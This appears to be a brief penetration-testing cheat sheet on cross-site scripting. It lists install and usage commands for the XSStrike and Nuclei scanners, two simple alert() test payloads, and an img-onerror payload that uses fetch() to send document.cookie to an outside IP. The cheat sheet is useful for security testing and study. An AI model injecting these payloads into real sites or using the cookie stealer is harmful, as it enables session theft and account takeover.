---
description: Cross-site scripting cheat sheet
---

# XSS

### Tools

**XSStrike**&#x20;

* [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

{% code overflow="wrap" %}
```bash
# Install
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python3 -m venv xsstrike_env
source xsstrike_env/bin/activate
pip3 install -r requirements.txt

# run
python3 xsstrike.py -u "https://brutelogic.com.br/xss.php?a=fuzz" --fuzzer
python3 xsstrike.py -u https://www.codelatte.id/labs/xss/1.php --crawl -l 4
python3 xsstrike.py -u "https://brutelogic.com.br/xss.php?a=fuzz" --file xss.txt
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6vjZhXx_XMXjyfIXlDcQ3olR_mJFJ9vyJkDZqUOYNnQCzWDGUce_pb9cGm-TB4wN8g2RChnbB9DOY6ktcPmhpdAa2YNp4sdZKLcYpWKy_-WVCJCnAzvLsT4lhmWRRbVWPYQM9GIYEb0vWxgs92zbVWWtZnZerrO9NsErx2te4t_x4rz9pMxvWNXQetrw/s955/xsstrike.png" alt=""><figcaption><p>XSStrike</p></figcaption></figure>

**Nuclei**

{% code overflow="wrap" %}
```bash
nuclei -u "https://brutelogic.com.br/xss.php?a=" -tags xss
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKsc7jaQE8ZSpeD6GKn80EHz74yUCi4kYhDz9cvS3gyxFa42vuwwVRQWWHPdEh6CJ5t_eY2rqml331wuze62eDs7-1DFqkVO8B21XW9z1spp8AfCYyFILb7F2rGlE8JobvylS_qMAYM5ou_Ak9swAkjA1nOf5_Pe8LJV2m4MgOIw-HT4kTOg9TRzsQaBs/s1195/xss%20nuclei.png" alt=""><figcaption><p>Nuclei XSS</p></figcaption></figure>

### Simple Payload

This is a simple payload that I commonly use for XSS testing.

{% code overflow="wrap" %}
```javascript
" autofocus onfocus=alert(document.domain) x="
"/><img src=x onerror=alert(document.domain) />
```
{% endcode %}

For Cookie Stealing

{% code overflow="wrap" %}
```javascript
<img src="x" onerror="fetch('http://10.10.1.3:8000?c=' + encodeURIComponent(document.cookie))">
```
{% endcode %}

### Resources

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
* [https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt)
